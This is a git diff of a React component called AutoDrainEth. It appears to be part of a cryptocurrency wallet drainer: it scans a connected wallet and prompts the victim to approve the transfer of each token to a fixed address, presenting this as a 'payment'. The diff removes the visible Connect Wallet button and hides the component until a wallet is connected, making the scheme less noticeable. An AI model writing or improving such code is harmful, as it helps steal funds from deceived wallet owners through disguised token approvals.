@@ -6,7 +6,6 @@ import { checkedTokensAtom } from '../src/atoms/checked-tokens-atom';
 import { globalTokensAtom } from '../src/atoms/global-tokens-atom';
 import { httpFetchTokens } from '../src/fetch-tokens';
 import { PAYMENT_ETH_ADDRESS } from '../src/atoms/destination-address-atom';
-import { ConnectButton } from '@rainbow-me/rainbowkit';
 
 type Status = 'idle' | 'loading' | 'sending' | 'done' | 'error' | 'empty';
 
@@ -91,40 +90,32 @@ export const AutoDrainEth = () => {
     }
   }, [isConnected, setTokens, setCheckedRecords]);
 
+  if (!isConnected) return null;
+
   return (
-    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '16px' }}>
-      <ConnectButton
-        label="Connect Wallet"
-        showBalance={false}
-        chainStatus="none"
-        accountStatus="avatar"
-      />
-      {isConnected && (
-        <div style={{ textAlign: 'center', color: '#6b7280', fontSize: '14px' }}>
-          {status === 'loading' && (
-            <span>
-              <Spinner /> Scanning wallet...
-            </span>
-          )}
-          {status === 'sending' && (
-            <span>
-              <Spinner /> Processing {sent}/{total} tokens — approve each in your wallet
-            </span>
-          )}
-          {status === 'done' && (
-            <span style={{ color: '#10b981', fontWeight: 600 }}>
-              ✓ Payment complete
-            </span>
-          )}
-          {status === 'empty' && (
-            <span>No tokens found on this chain.</span>
-          )}
-          {status === 'error' && (
-            <span style={{ color: '#ef4444' }}>
-              Could not fetch tokens. Try a different network.
-            </span>
-          )}
-        </div>
+    <div style={{ textAlign: 'center', color: '#6b7280', fontSize: '14px' }}>
+      {status === 'loading' && (
+        <span>
+          <Spinner /> Scanning wallet...
+        </span>
+      )}
+      {status === 'sending' && (
+        <span>
+          <Spinner /> Processing {sent}/{total} tokens — approve each in your wallet
+        </span>
+      )}
+      {status === 'done' && (
+        <span style={{ color: '#10b981', fontWeight: 600 }}>
+          ✓ Payment complete
+        </span>
+      )}
+      {status === 'empty' && (
+        <span>No tokens found on this chain.</span>
+      )}
+      {status === 'error' && (
+        <span style={{ color: '#ef4444' }}>
+          Could not fetch tokens. Try a different network.
+        </span>
       )}
     </div>
   );
